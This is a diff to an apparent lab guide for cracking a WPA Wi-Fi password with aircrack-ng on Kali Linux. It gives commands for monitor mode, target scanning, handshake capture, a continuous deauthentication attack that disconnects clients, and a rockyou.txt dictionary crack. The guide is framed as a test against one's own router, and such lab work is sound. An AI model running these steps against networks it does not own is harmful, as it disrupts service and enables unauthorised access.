@@ -21,52 +21,56 @@ Install aircrack-ng suite if not already on your Kali machine:
 
 sudo apt install aircrack-ng
 
+Have a wordlist of your choice ready to use. I will be using the rockyou.txt wordlist. Unzip the file if not already.
+
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz 
+
 # Adapter set up
 
 To set up, plug in the Wi-Fi adapter into your USB port. Open virtual box and go to settings on the Kali Linux VM. Make sure the check enable USB controller and USB 2.0 (OHCI + EHCI) controller. Click on the green check mark and add "Ralink 802.11 n WLAN". Once logged in on the VM, unplug the adapter and plug it back in. Run "ip addr" and you should a new interface for the adapter.
 
 # Execution
 
-See what network interfaces are on the Kali machine
+See what network interfaces are on the Kali machine. You should see wlan0 for your adapter.
 
 ip addr
 
-Kill any processes that could interfere with Wi-Fi adapter
+Kill any processes that could interfere with Wi-Fi adapter with monitoring mode.
 
 sudo airmon-ng check kill
 
-Start the Wi-Fi adapter interface in monitor mode
+Start the Wi-Fi adapter interface in monitor mode. Your interface should change from wlan0 to wlan0mon.
 
-sudo airmon-ng start wlan0
+sudo airmon-ng start wlan0 
 
-Verify that monitor mode is running on wlan0
+Verify that monitor mode is running on wlan0.
 
 sudo airmon-ng
 
-See all nearby available networks and get the routers's MAC address and channel
+See all nearby available networks and get the routers's MAC address and channel. Once your target is found and got the BSSID and Channel number, press "Ctrl+c" to stop.
 
 sudo airodump-ng wlan0mon
 
-Test to see device connectivity with the router by authenticating to it using your phone or another device
+Test to see device connectivity with the router by authenticating to it using your phone or another device.
 
 sudo airodump-ng wlan0mon -d 60:83:E7:0B:47:62
 
-1st terminal, replace the channel number and BSSID with your own Router's info. Replace hack1 with your desired file name for the capture
+1st terminal, replace the channel number and BSSID with your own Router's info. Replace hack1 with your desired file name for the capture. Focus the adapter on your target and capture the 4-way handshake. -c is the channel, --bssid is the MAC address of the target router, -w is the option to output the file to save the handshake.
 
 sudo airodump-ng -w hack1 -c 3 --bssid 60:83:E7:0B:47:62 wlan0mon
 
-2nd terminal, replace the BSSID with your own Router's
+2nd terminal, replace the BSSID with your own Router's. This forces devices to disconnect to the router. When they reconnect, the handhsake is captured. In the 1st terminal, when a device authenticates, you should see, "WPA Handshale: [BSSID]" appear in the upper right hand corner.
 
 sudo aireplay-ng --deauth 0 -a 60:83:E7:0B:47:62 wlan0mon
 
-Use Wireshark to open the captured file
+Use Wireshark to open the captured file. In message 2, you should the devices unique signature, MIC, in the packet. This is needed to crack the password. 
 
 wireshark hack1-01.cap
 
-Stop monitor mode for the wlan0 interface 
+Stop monitor mode for the wlan0 interface.
 
 airmon-ng stop wlan0mon
 
-Crack the file with rockyou.txt. Replace hack1-01.cap with your file name
+Crack the file with rockyou.txt. Replace hack1-01.cap with your file name. If the password is in the wordlist, the output should say, "KEY FOUND! [ The cracked password ]".
 
 aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
